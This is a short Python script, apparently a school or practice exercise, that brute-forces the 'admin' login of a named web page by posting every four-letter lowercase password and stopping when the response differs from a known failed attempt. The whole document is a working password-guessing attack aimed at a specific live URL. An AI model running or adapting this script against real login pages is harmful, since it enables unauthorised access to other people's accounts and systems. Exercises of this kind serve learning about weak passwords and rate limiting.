import requests

url = 'https://dudo.gvpt.sk/bruteforce2/index.php'
lett = ('zyxwvutsrqponmlkjihgfedcba')

inv = requests.post(url, data = {'username':'admin', 'password':'INVA'})
inv = inv.text
passsword = 'nezname'


def brute_force():
    for a in lett:
        for b in lett:
            for c in lett:
                for d in lett:
                    heslo = str(a+b+c+d)
                    data = {'username': 'admin',
                            'password': heslo}
                    r = requests.post(url, data=data)
                    r = r.text
                    if r!=inv:
                        print('heslo je', heslo)
                        return heslo

brute_force()

